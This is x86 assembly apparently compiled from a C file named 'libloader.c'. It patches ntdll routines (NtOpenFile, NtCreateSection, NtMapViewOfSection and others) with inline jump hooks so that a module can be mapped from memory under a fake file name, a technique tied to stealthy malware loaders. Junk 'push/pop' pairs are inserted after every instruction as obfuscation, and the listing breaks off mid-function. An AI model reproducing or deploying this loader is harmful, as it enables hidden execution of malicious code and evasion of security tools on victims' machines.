	.file	"libloader.c"
	.text
	.globl	_ctx
	.bss
	.align 4
_ctx:
	.space 4
	.text
	.globl	_find_string
	.def	_find_string;	.scl	2;	.type	32;	.endef
_find_string:
	pushl	%ebp
push %eax
pop %eax
	movl	%esp, %ebp
push %eax
pop %eax
	subl	$16, %esp
push %eax
pop %eax
	movl	$0, -4(%ebp)
push %eax
pop %eax
	jmp	L2
push %eax
pop %eax
L9:
	movl	$0, -8(%ebp)
push %eax
pop %eax
	jmp	L3
push %eax
pop %eax
L6:
	movl	12(%ebp), %eax
push %eax
pop %eax
	movl	4(%eax), %eax
push %eax
pop %eax
	movl	-4(%ebp), %ecx
push %eax
pop %eax
	movl	-8(%ebp), %edx
push %eax
pop %eax
	addl	%ecx, %edx
push %eax
pop %eax
	addl	%edx, %edx
push %eax
pop %eax
	addl	%edx, %eax
push %eax
pop %eax
	movzwl	(%eax), %eax
push %eax
pop %eax
	movzwl	%ax, %edx
push %eax
pop %eax
	movl	8(%ebp), %ecx
push %eax
pop %eax
	movl	-8(%ebp), %eax
push %eax
pop %eax
	addl	%ecx, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movsbl	%al, %eax
push %eax
pop %eax
	cmpl	%eax, %edx
push %eax
pop %eax
	jne	L10
push %eax
pop %eax
	addl	$1, -8(%ebp)
push %eax
pop %eax
L3:
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	256(%eax), %eax
push %eax
pop %eax
	cmpl	%eax, -8(%ebp)
push %eax
pop %eax
	jl	L6
push %eax
pop %eax
	jmp	L5
push %eax
pop %eax
L10:
	nop
push %eax
pop %eax
L5:
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	256(%eax), %eax
push %eax
pop %eax
	cmpl	%eax, -8(%ebp)
push %eax
pop %eax
	jne	L7
push %eax
pop %eax
	movl	$0, %eax
push %eax
pop %eax
	jmp	L8
push %eax
pop %eax
L7:
	addl	$1, -4(%ebp)
push %eax
pop %eax
L2:
	movl	12(%ebp), %eax
push %eax
pop %eax
	movzwl	(%eax), %eax
push %eax
pop %eax
	movzwl	%ax, %eax
push %eax
pop %eax
	cmpl	%eax, -4(%ebp)
push %eax
pop %eax
	jl	L9
push %eax
pop %eax
	movl	$1, %eax
push %eax
pop %eax
L8:
	leave
push %eax
pop %eax
	ret
push %eax
pop %eax
	.globl	_m_NtOpenSection@12
	.def	_m_NtOpenSection@12;	.scl	2;	.type	32;	.endef
_m_NtOpenSection@12:
	pushl	%ebp
push %eax
pop %eax
	movl	%esp, %ebp
push %eax
pop %eax
	subl	$24, %esp
push %eax
pop %eax
	movl	16(%ebp), %eax
push %eax
pop %eax
	movl	8(%eax), %edx
push %eax
pop %eax
	movl	_ctx, %eax
push %eax
pop %eax
	movl	%edx, 4(%esp)
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_find_string
push %eax
pop %eax
	testl	%eax, %eax
push %eax
pop %eax
	jne	L12
push %eax
pop %eax
	movl	_ctx, %eax
push %eax
pop %eax
	movl	268(%eax), %eax
push %eax
pop %eax
	movl	%eax, %edx
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	%edx, (%eax)
push %eax
pop %eax
	movl	$0, %eax
push %eax
pop %eax
	jmp	L13
push %eax
pop %eax
L12:
	movl	_ctx, %eax
push %eax
pop %eax
	movl	360(%eax), %eax
push %eax
pop %eax
	movl	16(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 8(%esp)
push %eax
pop %eax
	movl	12(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 4(%esp)
push %eax
pop %eax
	movl	8(%ebp), %edx
push %eax
pop %eax
	movl	%edx, (%esp)
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$12, %esp
push %eax
pop %eax
L13:
	leave
push %eax
pop %eax
	ret	$12
push %eax
pop %eax
	.globl	_m_NtQueryAttributesFile@8
	.def	_m_NtQueryAttributesFile@8;	.scl	2;	.type	32;	.endef
_m_NtQueryAttributesFile@8:
	pushl	%ebp
push %eax
pop %eax
	movl	%esp, %ebp
push %eax
pop %eax
	subl	$24, %esp
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	8(%eax), %edx
push %eax
pop %eax
	movl	_ctx, %eax
push %eax
pop %eax
	movl	%edx, 4(%esp)
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_find_string
push %eax
pop %eax
	testl	%eax, %eax
push %eax
pop %eax
	jne	L15
push %eax
pop %eax
	movl	12(%ebp), %eax
push %eax
pop %eax
	movl	$2116508896, (%eax)
push %eax
pop %eax
	movl	12(%ebp), %eax
push %eax
pop %eax
	movl	$29631226, 4(%eax)
push %eax
pop %eax
	movl	12(%ebp), %eax
push %eax
pop %eax
	movl	$-1910022944, 8(%eax)
push %eax
pop %eax
	movl	12(%ebp), %eax
push %eax
pop %eax
	movl	$29631226, 12(%eax)
push %eax
pop %eax
	movl	12(%ebp), %eax
push %eax
pop %eax
	movl	$2116508896, 16(%eax)
push %eax
pop %eax
	movl	12(%ebp), %eax
push %eax
pop %eax
	movl	$29631226, 20(%eax)
push %eax
pop %eax
	movl	12(%ebp), %eax
push %eax
pop %eax
	movl	$2116508896, 24(%eax)
push %eax
pop %eax
	movl	12(%ebp), %eax
push %eax
pop %eax
	movl	$29631226, 28(%eax)
push %eax
pop %eax
	movl	12(%ebp), %eax
push %eax
pop %eax
	movl	$128, 32(%eax)
push %eax
pop %eax
	movl	$0, %eax
push %eax
pop %eax
	jmp	L16
push %eax
pop %eax
L15:
	movl	_ctx, %eax
push %eax
pop %eax
	movl	364(%eax), %eax
push %eax
pop %eax
	movl	12(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 4(%esp)
push %eax
pop %eax
	movl	8(%ebp), %edx
push %eax
pop %eax
	movl	%edx, (%esp)
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$8, %esp
push %eax
pop %eax
L16:
	leave
push %eax
pop %eax
	ret	$8
push %eax
pop %eax
	.globl	_m_NtOpenFile@24
	.def	_m_NtOpenFile@24;	.scl	2;	.type	32;	.endef
_m_NtOpenFile@24:
	pushl	%ebp
push %eax
pop %eax
	movl	%esp, %ebp
push %eax
pop %eax
	subl	$40, %esp
push %eax
pop %eax
	movl	16(%ebp), %eax
push %eax
pop %eax
	movl	8(%eax), %edx
push %eax
pop %eax
	movl	_ctx, %eax
push %eax
pop %eax
	movl	%edx, 4(%esp)
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_find_string
push %eax
pop %eax
	testl	%eax, %eax
push %eax
pop %eax
	jne	L18
push %eax
pop %eax
	movl	_ctx, %eax
push %eax
pop %eax
	movl	268(%eax), %eax
push %eax
pop %eax
	movl	%eax, %edx
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	%edx, (%eax)
push %eax
pop %eax
	jmp	L17
push %eax
pop %eax
L18:
	movl	_ctx, %eax
push %eax
pop %eax
	movl	368(%eax), %eax
push %eax
pop %eax
	movl	28(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 20(%esp)
push %eax
pop %eax
	movl	24(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 16(%esp)
push %eax
pop %eax
	movl	20(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 12(%esp)
push %eax
pop %eax
	movl	16(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 8(%esp)
push %eax
pop %eax
	movl	12(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 4(%esp)
push %eax
pop %eax
	movl	8(%ebp), %edx
push %eax
pop %eax
	movl	%edx, (%esp)
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$24, %esp
push %eax
pop %eax
	nop
push %eax
pop %eax
L17:
	leave
push %eax
pop %eax
	ret	$24
push %eax
pop %eax
	.globl	_m_NtCreateSection@28
	.def	_m_NtCreateSection@28;	.scl	2;	.type	32;	.endef
_m_NtCreateSection@28:
	pushl	%ebp
push %eax
pop %eax
	movl	%esp, %ebp
push %eax
pop %eax
	subl	$40, %esp
push %eax
pop %eax
	movl	_ctx, %eax
push %eax
pop %eax
	movl	268(%eax), %eax
push %eax
pop %eax
	cmpl	%eax, 32(%ebp)
push %eax
pop %eax
	jne	L21
push %eax
pop %eax
	movl	_ctx, %eax
push %eax
pop %eax
	movl	268(%eax), %eax
push %eax
pop %eax
	movl	%eax, %edx
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	%edx, (%eax)
push %eax
pop %eax
	movl	$0, %eax
push %eax
pop %eax
	jmp	L22
push %eax
pop %eax
L21:
	movl	_ctx, %eax
push %eax
pop %eax
	movl	372(%eax), %eax
push %eax
pop %eax
	movl	32(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 24(%esp)
push %eax
pop %eax
	movl	28(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 20(%esp)
push %eax
pop %eax
	movl	24(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 16(%esp)
push %eax
pop %eax
	movl	20(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 12(%esp)
push %eax
pop %eax
	movl	16(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 8(%esp)
push %eax
pop %eax
	movl	12(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 4(%esp)
push %eax
pop %eax
	movl	8(%ebp), %edx
push %eax
pop %eax
	movl	%edx, (%esp)
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$28, %esp
push %eax
pop %eax
L22:
	leave
push %eax
pop %eax
	ret	$28
push %eax
pop %eax
	.globl	_m_NtMapViewOfSection@40
	.def	_m_NtMapViewOfSection@40;	.scl	2;	.type	32;	.endef
_m_NtMapViewOfSection@40:
	pushl	%ebp
push %eax
pop %eax
	movl	%esp, %ebp
push %eax
pop %eax
	subl	$56, %esp
push %eax
pop %eax
	movl	_ctx, %eax
push %eax
pop %eax
	movl	268(%eax), %eax
push %eax
pop %eax
	cmpl	%eax, 8(%ebp)
push %eax
pop %eax
	jne	L24
push %eax
pop %eax
	movl	_ctx, %eax
push %eax
pop %eax
	movl	268(%eax), %eax
push %eax
pop %eax
	movl	%eax, %edx
push %eax
pop %eax
	movl	16(%ebp), %eax
push %eax
pop %eax
	movl	%edx, (%eax)
push %eax
pop %eax
	movl	_ctx, %eax
push %eax
pop %eax
	movl	272(%eax), %edx
push %eax
pop %eax
	movl	32(%ebp), %eax
push %eax
pop %eax
	movl	%edx, (%eax)
push %eax
pop %eax
	movl	$1073741827, %eax
push %eax
pop %eax
	jmp	L25
push %eax
pop %eax
L24:
	movl	_ctx, %eax
push %eax
pop %eax
	movl	376(%eax), %eax
push %eax
pop %eax
	movl	44(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 36(%esp)
push %eax
pop %eax
	movl	40(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 32(%esp)
push %eax
pop %eax
	movl	36(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 28(%esp)
push %eax
pop %eax
	movl	32(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 24(%esp)
push %eax
pop %eax
	movl	28(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 20(%esp)
push %eax
pop %eax
	movl	24(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 16(%esp)
push %eax
pop %eax
	movl	20(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 12(%esp)
push %eax
pop %eax
	movl	16(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 8(%esp)
push %eax
pop %eax
	movl	12(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 4(%esp)
push %eax
pop %eax
	movl	8(%ebp), %edx
push %eax
pop %eax
	movl	%edx, (%esp)
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$40, %esp
push %eax
pop %eax
L25:
	leave
push %eax
pop %eax
	ret	$40
push %eax
pop %eax
	.globl	_m_NtClose@4
	.def	_m_NtClose@4;	.scl	2;	.type	32;	.endef
_m_NtClose@4:
	pushl	%ebp
push %eax
pop %eax
	movl	%esp, %ebp
push %eax
pop %eax
	subl	$24, %esp
push %eax
pop %eax
	movl	_ctx, %eax
push %eax
pop %eax
	movl	268(%eax), %eax
push %eax
pop %eax
	cmpl	%eax, 8(%ebp)
push %eax
pop %eax
	jne	L27
push %eax
pop %eax
	movl	$0, %eax
push %eax
pop %eax
	jmp	L28
push %eax
pop %eax
L27:
	movl	_ctx, %eax
push %eax
pop %eax
	movl	380(%eax), %eax
push %eax
pop %eax
	movl	8(%ebp), %edx
push %eax
pop %eax
	movl	%edx, (%esp)
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$4, %esp
push %eax
pop %eax
L28:
	leave
push %eax
pop %eax
	ret	$4
push %eax
pop %eax
	.globl	_patch_function
	.def	_patch_function;	.scl	2;	.type	32;	.endef
_patch_function:
	pushl	%ebp
push %eax
pop %eax
	movl	%esp, %ebp
push %eax
pop %eax
	pushl	%ebx
push %eax
pop %eax
	subl	$84, %esp
push %eax
pop %eax
	movl	$5, -12(%ebp)
push %eax
pop %eax
	movl	12(%ebp), %eax
push %eax
pop %eax
	leal	-20(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 16(%esp)
push %eax
pop %eax
	movl	-12(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 12(%esp)
push %eax
pop %eax
	movl	%eax, 8(%esp)
push %eax
pop %eax
	movl	16(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	$-1, (%esp)
push %eax
pop %eax
	movl	__imp__WriteProcessMemory@20, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$20, %esp
push %eax
pop %eax
	movl	16(%ebp), %edx
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	addl	%edx, %eax
push %eax
pop %eax
	movb	$-23, (%eax)
push %eax
pop %eax
	movl	16(%ebp), %eax
push %eax
pop %eax
	movl	12(%ebp), %edx
push %eax
pop %eax
	subl	%eax, %edx
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	leal	1(%eax), %ecx
push %eax
pop %eax
	movl	16(%ebp), %eax
push %eax
pop %eax
	addl	%ecx, %eax
push %eax
pop %eax
	subl	$5, %edx
push %eax
pop %eax
	movl	%edx, (%eax)
push %eax
pop %eax
	movl	12(%ebp), %eax
push %eax
pop %eax
	movl	$28, 8(%esp)
push %eax
pop %eax
	leal	-48(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 4(%esp)
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__VirtualQuery@12, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$12, %esp
push %eax
pop %eax
	movl	-36(%ebp), %edx
push %eax
pop %eax
	movl	-48(%ebp), %eax
push %eax
pop %eax
	leal	-48(%ebp), %ecx
push %eax
pop %eax
	addl	$20, %ecx
push %eax
pop %eax
	movl	%ecx, 12(%esp)
push %eax
pop %eax
	movl	$64, 8(%esp)
push %eax
pop %eax
	movl	%edx, 4(%esp)
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__VirtualProtect@16, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$16, %esp
push %eax
pop %eax
	movl	12(%ebp), %eax
push %eax
pop %eax
	movb	$-23, (%eax)
push %eax
pop %eax
	movl	20(%ebp), %eax
push %eax
pop %eax
	subl	12(%ebp), %eax
push %eax
pop %eax
	movl	12(%ebp), %edx
push %eax
pop %eax
	addl	$1, %edx
push %eax
pop %eax
	subl	$5, %eax
push %eax
pop %eax
	movl	%eax, (%edx)
push %eax
pop %eax
	movl	-28(%ebp), %ecx
push %eax
pop %eax
	movl	-36(%ebp), %edx
push %eax
pop %eax
	movl	-48(%ebp), %eax
push %eax
pop %eax
	leal	-16(%ebp), %ebx
push %eax
pop %eax
	movl	%ebx, 12(%esp)
push %eax
pop %eax
	movl	%ecx, 8(%esp)
push %eax
pop %eax
	movl	%edx, 4(%esp)
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__VirtualProtect@16, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$16, %esp
push %eax
pop %eax
	movl	-36(%ebp), %edx
push %eax
pop %eax
	movl	-48(%ebp), %eax
push %eax
pop %eax
	movl	%edx, 8(%esp)
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	$-1, (%esp)
push %eax
pop %eax
	movl	__imp__FlushInstructionCache@12, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$12, %esp
push %eax
pop %eax
	nop
push %eax
pop %eax
	movl	-4(%ebp), %ebx
push %eax
pop %eax
	leave
push %eax
pop %eax
	ret
push %eax
pop %eax
	.section .rdata,"dr"
LC0:
	.ascii "ntdll\0"
LC1:
	.ascii "NtMapViewOfSection\0"
LC2:
	.ascii "NtQueryAttributesFile\0"
LC3:
	.ascii "NtOpenFile\0"
LC4:
	.ascii "NtCreateSection\0"
LC5:
	.ascii "NtOpenSection\0"
LC6:
	.ascii "NtClose\0"
	.text
	.globl	_install_hooks
	.def	_install_hooks;	.scl	2;	.type	32;	.endef
_install_hooks:
	pushl	%ebp
push %eax
pop %eax
	movl	%esp, %ebp
push %eax
pop %eax
	subl	$56, %esp
push %eax
pop %eax
	movl	$LC0, (%esp)
push %eax
pop %eax
	movl	__imp__LoadLibraryA@4, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$4, %esp
push %eax
pop %eax
	movl	%eax, -12(%ebp)
push %eax
pop %eax
	cmpl	$0, -12(%ebp)
push %eax
pop %eax
	je	L33
push %eax
pop %eax
	movl	$LC1, 4(%esp)
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__GetProcAddress@8, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$8, %esp
push %eax
pop %eax
	movl	%eax, -16(%ebp)
push %eax
pop %eax
	movl	$LC2, 4(%esp)
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__GetProcAddress@8, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$8, %esp
push %eax
pop %eax
	movl	%eax, -20(%ebp)
push %eax
pop %eax
	movl	$LC3, 4(%esp)
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__GetProcAddress@8, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$8, %esp
push %eax
pop %eax
	movl	%eax, -24(%ebp)
push %eax
pop %eax
	movl	$LC4, 4(%esp)
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__GetProcAddress@8, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$8, %esp
push %eax
pop %eax
	movl	%eax, -28(%ebp)
push %eax
pop %eax
	movl	$LC5, 4(%esp)
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__GetProcAddress@8, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$8, %esp
push %eax
pop %eax
	movl	%eax, -32(%ebp)
push %eax
pop %eax
	movl	$LC6, 4(%esp)
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__GetProcAddress@8, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$8, %esp
push %eax
pop %eax
	movl	%eax, -36(%ebp)
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	leal	316(%eax), %edx
push %eax
pop %eax
	movl	-16(%ebp), %eax
push %eax
pop %eax
	movl	$_m_NtMapViewOfSection@40, 12(%esp)
push %eax
pop %eax
	movl	%edx, 8(%esp)
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_patch_function
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	addl	$316, %eax
push %eax
pop %eax
	movl	%eax, %edx
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	%edx, 376(%eax)
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	leal	286(%eax), %edx
push %eax
pop %eax
	movl	-20(%ebp), %eax
push %eax
pop %eax
	movl	$_m_NtQueryAttributesFile@8, 12(%esp)
push %eax
pop %eax
	movl	%edx, 8(%esp)
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_patch_function
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	addl	$286, %eax
push %eax
pop %eax
	movl	%eax, %edx
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	%edx, 364(%eax)
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	leal	296(%eax), %edx
push %eax
pop %eax
	movl	-24(%ebp), %eax
push %eax
pop %eax
	movl	$_m_NtOpenFile@24, 12(%esp)
push %eax
pop %eax
	movl	%edx, 8(%esp)
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_patch_function
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	addl	$296, %eax
push %eax
pop %eax
	movl	%eax, %edx
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	%edx, 368(%eax)
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	leal	306(%eax), %edx
push %eax
pop %eax
	movl	-28(%ebp), %eax
push %eax
pop %eax
	movl	$_m_NtCreateSection@28, 12(%esp)
push %eax
pop %eax
	movl	%edx, 8(%esp)
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_patch_function
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	addl	$306, %eax
push %eax
pop %eax
	movl	%eax, %edx
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	%edx, 372(%eax)
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	leal	276(%eax), %edx
push %eax
pop %eax
	movl	-32(%ebp), %eax
push %eax
pop %eax
	movl	$_m_NtOpenSection@12, 12(%esp)
push %eax
pop %eax
	movl	%edx, 8(%esp)
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_patch_function
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	addl	$276, %eax
push %eax
pop %eax
	movl	%eax, %edx
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	%edx, 360(%eax)
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	leal	326(%eax), %edx
push %eax
pop %eax
	movl	-36(%ebp), %eax
push %eax
pop %eax
	movl	$_m_NtClose@4, 12(%esp)
push %eax
pop %eax
	movl	%edx, 8(%esp)
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_patch_function
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	addl	$326, %eax
push %eax
pop %eax
	movl	%eax, %edx
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	%edx, 380(%eax)
push %eax
pop %eax
	jmp	L30
push %eax
pop %eax
L33:
	nop
push %eax
pop %eax
L30:
	leave
push %eax
pop %eax
	ret
push %eax
pop %eax
	.globl	_restore_function
	.def	_restore_function;	.scl	2;	.type	32;	.endef
_restore_function:
	pushl	%ebp
push %eax
pop %eax
	movl	%esp, %ebp
push %eax
pop %eax
	pushl	%ebx
push %eax
pop %eax
	subl	$84, %esp
push %eax
pop %eax
	movl	$5, -12(%ebp)
push %eax
pop %eax
	movl	12(%ebp), %eax
push %eax
pop %eax
	movl	$28, 8(%esp)
push %eax
pop %eax
	leal	-48(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 4(%esp)
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__VirtualQuery@12, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$12, %esp
push %eax
pop %eax
	movl	-36(%ebp), %edx
push %eax
pop %eax
	movl	-48(%ebp), %eax
push %eax
pop %eax
	leal	-48(%ebp), %ecx
push %eax
pop %eax
	addl	$20, %ecx
push %eax
pop %eax
	movl	%ecx, 12(%esp)
push %eax
pop %eax
	movl	$64, 8(%esp)
push %eax
pop %eax
	movl	%edx, 4(%esp)
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__VirtualProtect@16, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$16, %esp
push %eax
pop %eax
	movl	12(%ebp), %eax
push %eax
pop %eax
	leal	-20(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 16(%esp)
push %eax
pop %eax
	movl	-12(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 12(%esp)
push %eax
pop %eax
	movl	16(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 8(%esp)
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	$-1, (%esp)
push %eax
pop %eax
	movl	__imp__WriteProcessMemory@20, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$20, %esp
push %eax
pop %eax
	movl	-28(%ebp), %ecx
push %eax
pop %eax
	movl	-36(%ebp), %edx
push %eax
pop %eax
	movl	-48(%ebp), %eax
push %eax
pop %eax
	leal	-16(%ebp), %ebx
push %eax
pop %eax
	movl	%ebx, 12(%esp)
push %eax
pop %eax
	movl	%ecx, 8(%esp)
push %eax
pop %eax
	movl	%edx, 4(%esp)
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__VirtualProtect@16, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$16, %esp
push %eax
pop %eax
	movl	-36(%ebp), %edx
push %eax
pop %eax
	movl	-48(%ebp), %eax
push %eax
pop %eax
	movl	%edx, 8(%esp)
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	$-1, (%esp)
push %eax
pop %eax
	movl	__imp__FlushInstructionCache@12, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$12, %esp
push %eax
pop %eax
	nop
push %eax
pop %eax
	movl	-4(%ebp), %ebx
push %eax
pop %eax
	leave
push %eax
pop %eax
	ret
push %eax
pop %eax
	.globl	_remove_hooks
	.def	_remove_hooks;	.scl	2;	.type	32;	.endef
_remove_hooks:
	pushl	%ebp
push %eax
pop %eax
	movl	%esp, %ebp
push %eax
pop %eax
	subl	$56, %esp
push %eax
pop %eax
	movl	$LC0, (%esp)
push %eax
pop %eax
	movl	__imp__LoadLibraryA@4, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$4, %esp
push %eax
pop %eax
	movl	%eax, -12(%ebp)
push %eax
pop %eax
	cmpl	$0, -12(%ebp)
push %eax
pop %eax
	je	L38
push %eax
pop %eax
	movl	$LC1, 4(%esp)
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__GetProcAddress@8, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$8, %esp
push %eax
pop %eax
	movl	%eax, -16(%ebp)
push %eax
pop %eax
	movl	$LC2, 4(%esp)
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__GetProcAddress@8, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$8, %esp
push %eax
pop %eax
	movl	%eax, -20(%ebp)
push %eax
pop %eax
	movl	$LC3, 4(%esp)
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__GetProcAddress@8, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$8, %esp
push %eax
pop %eax
	movl	%eax, -24(%ebp)
push %eax
pop %eax
	movl	$LC4, 4(%esp)
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__GetProcAddress@8, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$8, %esp
push %eax
pop %eax
	movl	%eax, -28(%ebp)
push %eax
pop %eax
	movl	$LC5, 4(%esp)
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
